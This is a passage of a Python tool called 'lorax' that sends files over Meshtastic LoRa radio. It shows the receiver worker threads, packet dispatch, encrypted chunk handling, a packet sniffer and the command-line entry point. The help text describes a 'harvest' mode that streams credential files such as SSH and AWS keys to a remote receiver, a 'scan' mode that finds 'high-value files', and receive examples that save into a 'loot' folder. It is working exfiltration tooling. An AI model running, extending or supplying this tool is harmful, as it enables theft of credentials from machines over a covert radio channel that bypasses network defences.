                ok(f"Extracted {len(extracted)} file(s) → {c(C.BOLD, extract_dir)}/")
                for name in extracted:
                    print(f"         {c(C.DIM, name)}")
            except Exception as e:
                warn(f"Extraction failed: {e}")

    # ------------------------------------------------------------------
    # Per-transfer worker thread
    # ------------------------------------------------------------------
    def _worker(ctx):
        tid = ctx["tid"]
        try:
            while True:
                try:
                    ftype, body, from_id = ctx["q"].get(timeout=NACK_WAIT + 60)
                except queue.Empty:
                    warn(f"\nTransfer [{tid}] timed out — incomplete")
                    break

                if ftype == T_START:
                    # Sender retransmitted a fresh START — re-parse and reset
                    if len(body) >= 4:
                        total, algo, enc_flag = struct.unpack(">HBB", body[:4])
                        try:
                            if enc_flag == ENC_ON and my_priv_bytes and len(body) >= 4+32+12+16:
                                ephem_pub  = body[4:36]
                                nonce      = body[36:48]
                                sk         = _derive_session_key(my_priv_bytes, ephem_pub, tid)
                                dec        = ChaCha20Poly1305(sk).decrypt(nonce, body[48:], None)
                                filename   = dec[1:1+dec[0]].decode(errors="replace")
                                ctx.update(filename=filename, total=total, algo=algo,
                                           chunks={}, start_time=time.time(),
                                           from_id=from_id, session_key=sk)
                            else:
                                name_len = body[4]
                                filename = body[5:5+name_len].decode(errors="replace")
                                ctx.update(filename=filename, total=total, algo=algo,
                                           chunks={}, start_time=time.time(),
                                           from_id=from_id, session_key=None)
                        except Exception:
                            pass
                    continue

                if ftype == T_CHUNK and len(body) >= 2:
                    seq        = struct.unpack(">H", body[:2])[0]
                    chunk_data = body[2:]
                    sk = ctx.get("session_key")
                    if sk:
                        try:
                            chunk_data = dec_chunk(sk, tid, seq, chunk_data)
                        except Exception:
                            warn(f"\nChunk {seq} decryption failed [{tid}] — NACK")
                            nack_bdy = struct.pack(">HH", 1, seq)
                            send_frame(iface, T_NACK, tid, nack_bdy)
                            continue
                    ctx["chunks"][seq] = chunk_data
                    received          = len(ctx["chunks"])
                    total_            = ctx["total"] or seq
                    _eol = '\033[K' if C.supports_color() else '   '
                    print(f"\r  {c(C.CYAN, '←')} [{c(C.BOLD, tid)}] "
                          f"{progress_bar(received, total_)}{_eol}",
                          end="", flush=True)
                    continue

                if ftype == T_CHECKPOINT and len(body) >= 2:
                    last_seq = struct.unpack(">H", body[:2])[0]
                    missing  = [i for i in range(1, last_seq + 1)
                                if i not in ctx["chunks"]]
                    if missing:
                        count    = len(missing)
                        nack_bdy = struct.pack(f">H{count}H", count, *missing)
                        send_frame(iface, T_NACK, tid, nack_bdy)
                        warn(f"\nCheckpoint NACK [{tid}]: {count} gap(s) up to seq {last_seq}")
                    continue

                if ftype == T_END and len(body) >= 16:
                    expected_md5 = body[:16].hex()
                    if ctx["total"] == 0 and not ctx["chunks"]:
                        break  # empty partial recovery — discard
                    missing = [i for i in range(1, ctx["total"] + 1)
                               if i not in ctx["chunks"]]
                    if missing:
                        count    = len(missing)
                        nack_bdy = struct.pack(f">H{count}H", count, *missing)
                        warn(f"\nMissing {count} chunk(s) — sending NACK [{tid}]")
                        send_frame(iface, T_NACK, tid, nack_bdy)
                        continue  # wait for retransmit chunks then another END
                    elapsed = time.time() - ctx["start_time"]
                    _eol = '\033[K' if C.supports_color() else '   '
                    print(f"\r  {c(C.GREEN, '←')} [{c(C.BOLD, tid)}] "
                          f"{progress_bar(ctx['total'], ctx['total'])}  complete{_eol}")
                    print()
                    m, s = divmod(int(elapsed), 60)
                    info(f"Transfer time: {m}m {s:02d}s")
                    info(f"Sending ACK  → (broadcast)")
                    send_frame(iface, T_ACK, tid)
                    _save(ctx, expected_md5)
                    break
        finally:
            with active_lock:
                active.pop(tid, None)

    # ------------------------------------------------------------------
    # Packet dispatcher (runs in meshtastic publishingThread)
    # ------------------------------------------------------------------
    def on_receive(packet, interface=None):  # interface unused; required by pubsub
        if not is_lorax_packet(packet):
            return
        ftype, tid, body = parse_frame(get_lorax_payload(packet))
        if ftype is None:
            return
        from_id = packet.get("fromId", "?")

        # Stateless — handle immediately
        if ftype == T_PING:
            snr  = float(packet.get("rxSnr") or 0)
            hops = (packet.get("hopStart") or 0) - (packet.get("hopLimit") or 0)
            send_frame(iface, T_PONG, tid,
                       struct.pack(">hB", int(snr * 10), max(0, hops)))
            info(f"PING from {c(C.BOLD, from_id)} — replied PONG  "
                 f"(SNR: {snr} dB, hops: {hops})")
            return

        if ftype == T_CHECK and len(body) >= 16:
            md5_hex = body[:16].hex()
            fname   = body[16:].decode(errors="replace")
            if md5_hex in recv_cache:
                send_frame(iface, T_HAVE, tid, body[:16])
                info(f"CHECK from {c(C.BOLD, from_id)}: already have {fname} — sent HAVE")
            return

        # T_START — spin up a new worker thread for this TID
        if ftype == T_START and len(body) >= 4:
            total, algo, enc_flag = struct.unpack(">HBB", body[:4])
            session_key = None
            if enc_flag == ENC_ON:
                if my_priv_bytes is None:
                    warn(f"Encrypted transfer from {from_id} but no key loaded — drop")
                    return
                if len(body) < 4 + 32 + 12 + 16:
                    warn(f"T_START too short for encrypted frame — drop")
                    return
                try:
                    ephem_pub   = body[4:36]
                    nonce       = body[36:48]
                    ciphertext  = body[48:]
                    session_key = _derive_session_key(my_priv_bytes, ephem_pub, tid)
                    decrypted   = ChaCha20Poly1305(session_key).decrypt(nonce, ciphertext, None)
                    name_len    = decrypted[0]
                    filename    = decrypted[1:1+name_len].decode(errors="replace")
                except Exception as ex:
                    err(f"T_START decryption failed from {from_id}: {ex}")
                    return
            else:
                name_len = body[4]
                filename = body[5:5+name_len].decode(errors="replace")

            with active_lock:
                if tid in active:
                    active[tid]["q"].put((T_START, body, from_id))
                    return
                ctx = {
                    "tid": tid, "filename": filename, "total": total,
                    "algo": algo, "from_id": from_id, "chunks": {},
                    "start_time": time.time(), "q": queue.Queue(),
                    "session_key": session_key,
                }
                active[tid] = ctx
            print()
            section(f"Incoming  [{c(C.BOLD, tid)}]")
            info(f"From      : {c(C.BOLD, from_id)}")
            info(f"File      : {c(C.BOLD, filename)}")
            info(f"Chunks    : {total}")
            info(f"Algo      : {COMP_LABEL.get(algo, '?')}")
            info(f"Encrypted : {c(C.GREEN, 'yes (E2E)') if session_key else c(C.YELLOW, 'no')}")
            print()
            threading.Thread(target=_worker, args=(ctx,),
                             daemon=True, name=f"lorax-{tid}").start()
            return

        # Route CHUNK / END / CHECKPOINT to the right thread
        with active_lock:
            ctx = active.get(tid)
        if ctx is not None:
            if ftype in (T_CHUNK, T_END, T_CHECKPOINT):
                ctx["q"].put((ftype, body, from_id))
            return

        # Missed START — partial recovery
        if ftype == T_CHUNK and len(body) >= 2:
            ctx = {
                "tid": tid, "filename": f"recovered_{tid}.bin", "total": 0,
                "algo": COMP_NONE, "from_id": from_id, "chunks": {},
                "start_time": time.time(), "q": queue.Queue(),
            }
            with active_lock:
                active[tid] = ctx
            warn(f"Missed START for {tid} — partial recovery mode")
            threading.Thread(target=_worker, args=(ctx,),
                             daemon=True, name=f"lorax-{tid}").start()
            ctx["q"].put((ftype, body, from_id))
        elif ftype == T_END:
            warn(f"END for unknown TID {tid}")

    return on_receive, active

def recv_mode(iface, output_dir, auto_extract=False, keyfile=DEFAULT_KEYFILE):
    os.makedirs(output_dir, exist_ok=True)
    build_recv_cache(output_dir)

    my_priv_bytes, my_pub_bytes = _load_or_create_keypair(keyfile)

    section("Receiver ready")
    info(f"Output dir   : {c(C.BOLD, os.path.abspath(output_dir))}")
    info(f"Auto-extract : {'yes' if auto_extract else 'no'}")
    info(f"Public key   : {c(C.BOLD, pubkey_to_b64(my_pub_bytes))}")
    info(f"Ctrl+C to stop")

    on_receive, active = make_receiver(iface, output_dir, auto_extract, my_priv_bytes)
    pub.subscribe(on_receive, RECV_TOPIC)

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print()
        warn("Stopped by user")
        if active:
            warn(f"{len(active)} incomplete transfer(s):")
            for tid, ctx in active.items():
                print(f"       {tid} — {ctx['filename']}  {len(ctx['chunks'])}/{ctx['total']} chunks")

# ---------------------------------------------------------------------------
# Sniff — raw packet dump for diagnosing radio / meshtastic connectivity
# ---------------------------------------------------------------------------

def sniff_mode(iface):
    section("Sniff mode — dumping all received meshtastic packets")
    if hasattr(iface, "myInfo") and iface.myInfo:
        info(f"Local node   : {c(C.BOLD, f'!{iface.myInfo.my_node_num:08x}')}")
    info("Listening on 'meshtastic.receive' (all portnum types)")
    info("Ctrl+C to stop")
    print()

    seen = [0]

    def on_any(packet, interface):
        del interface  # required by pubsub signature, not used here
        seen[0] += 1
        decoded  = packet.get("decoded", {})
        portnum  = decoded.get("portnum", "?")
        from_id  = packet.get("fromId", "?")
        to_id    = packet.get("toId",   "?")
        payload  = decoded.get("payload", b"")
        is_lorax = isinstance(payload, (bytes, bytearray)) and len(payload) >= 2 and payload[:2] == MAGIC
        tag      = c(C.GREEN, "LORAX") if is_lorax else c(C.DIM, "other")
        print(f"  {c(C.CYAN, '#' + str(seen[0])):<20} {tag:<20} "
              f"port={c(C.BOLD, str(portnum))}  "
              f"from={c(C.BOLD, str(from_id))}  to={c(C.BOLD, str(to_id))}  "
              f"payload={len(payload) if isinstance(payload, (bytes, bytearray)) else '?'}B"
              + (f"  magic={payload[:6]}" if isinstance(payload, (bytes, bytearray)) and payload else ""))

    pub.subscribe(on_any, "meshtastic.receive")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print()
        info(f"Sniff complete — {seen[0]} packet(s) received")
        if seen[0] == 0:
            warn("No packets received — likely a radio link or channel mismatch issue")
            warn("Verify both nodes are on the same channel/PSK and in RF range")

# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

def main():
    keys_help = ", ".join(sorted(HARVEST_KEYS))

    parser = argparse.ArgumentParser(
        prog="lorax",
        description=f"{TOOL_NAME} — {TOOL_DESC}",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""
Modes:
  harvest   Stream credential files to receiver in priority order
  send      Send a specific file
  recv      Listen for incoming transfers and save to disk
  scan      Preview what harvest would find without sending
  probe     Test link quality — RTT, SNR, recommended --delay
  bench     Benchmark transfer speed across four payload sizes

Harvest keys (--harvest-only):
  {keys_help}

Examples:
  lorax.py --mode harvest --radio 192.168.8.179 --dest '!eea17dfc'
  lorax.py --mode harvest --radio 192.168.8.179 --dest '!eea17dfc' --harvest-only ssh,aws
  lorax.py --mode recv    --radio serial --output ./loot --extract
  lorax.py --mode probe   --radio 192.168.8.179 --dest '!eea17dfc'
  lorax.py --mode bench   --radio 192.168.8.179 --dest '!eea17dfc' --delay 5
  lorax.py --mode send    --radio 192.168.8.179 --file id_rsa --dest '!eea17dfc' --delay 5
  lorax.py --mode sniff   --radio serial                       (diagnose: dumps all received packets)

E2E encryption:
  # On the receiver — prints public key to share with sender:
  lorax.py --mode recv --radio serial --output ./loot

  # On the sender — pass receiver's public key:
  lorax.py --mode harvest --radio 192.168.8.179 --dest '!eea17dfc' --pubkey <base64url>
        """
    )
    parser.add_argument("--mode",    required=True,
                        choices=["send", "recv", "harvest", "scan", "probe", "bench", "sniff", "conn"])
    parser.add_argument("--radio",   required=True,
                        help="IP address for TCP or 'serial' for USB auto-detect")
    parser.add_argument("--port",    default=None,  help="Serial port override")
    parser.add_argument("--file",    default=None,  help="File to send (send mode)")
    parser.add_argument("--dest",    default="!eea17dfc", help="Destination node ID")
    parser.add_argument("--delay",   type=int, default=DEFAULT_DELAY,
                        help=f"Seconds between chunks (default: {DEFAULT_DELAY}; "
                             f"run 'probe' mode for a link-specific recommendation)")
    parser.add_argument("--output",  default="./received",
                        help="Output directory for received files (default: ./received)")
    parser.add_argument("--extract", action="store_true",
                        help="Auto-extract tar bundles after receiving")
    parser.add_argument("--harvest-only", default=None, dest="harvest_only",
                        help=f"Comma-separated harvest categories. Keys: {keys_help}")
    parser.add_argument("--wait-ack", action="store_true", dest="wait_ack",
                        help="Wait for ACK/NACK after each transfer and retry on failure "
                             "(requires a working return path from receiver to sender)")
    parser.add_argument("--pubkey",  default=None,
                        help="Receiver's X25519 public key (base64url) for E2E encryption")
    parser.add_argument("--keyfile", default=DEFAULT_KEYFILE, dest="keyfile",
                        help=f"Receiver key file (default: {DEFAULT_KEYFILE})")

    args = parser.parse_args()

    if args.mode == "send" and not args.file:
        parser.error("--file is required in send mode")

    harvest_filter = None
    if args.harvest_only:
        keys    = {k.strip().lower() for k in args.harvest_only.split(",")}
        unknown = keys - set(HARVEST_KEYS)
        if unknown:
            parser.error(f"Unknown harvest key(s): {', '.join(sorted(unknown))}. "
                         f"Valid: {keys_help}")
        harvest_filter = keys

    banner()

    # Resolve E2E keys
    receiver_pubkey = None
    if args.pubkey:
        try:
            receiver_pubkey = b64_to_pubkey(args.pubkey)
            if len(receiver_pubkey) != 32:
                parser.error("--pubkey must be a 32-byte X25519 public key (base64url)")
        except Exception:
            parser.error("--pubkey is not valid base64url")

    if args.mode == "scan":
        section("Scanning for high-value files")
        if harvest_filter:
            info(f"Filter : {c(C.BOLD, ', '.join(sorted(harvest_filter)))}")
        found, raw_bytes = harvest_files(only=harvest_filter)
        print()
        if found:
            info(f"{c(C.BOLD, str(len(found)))} file(s) found  ({raw_bytes:,} bytes on disk)")
        else:
            warn("Nothing found")
        return

    iface = get_interface(args.radio, args.port)
    time.sleep(2)

    try:
        if args.mode == "probe":
            probe_mode(iface, args.dest)
        elif args.mode == "bench":
            benchmark_mode(iface, args.dest, args.delay, args.wait_ack, receiver_pubkey)
        elif args.mode == "send":
            section("Send mode")
            send_file(iface, args.file, args.dest, args.delay, args.wait_ack, receiver_pubkey)
        elif args.mode == "harvest":
            section("Harvest mode")
            harvest_mode(iface, args.dest, args.delay,
                         only=harvest_filter, wait_ack=args.wait_ack,
                         receiver_pubkey=receiver_pubkey)
        elif args.mode == "sniff":
            sniff_mode(iface)
        elif args.mode == "conn":
            conn_mode(iface, args.dest)
        else:
            recv_mode(iface, args.output, auto_extract=args.extract, keyfile=args.keyfile)
    finally:
        iface.close()


if __name__ == "__main__":
    main()
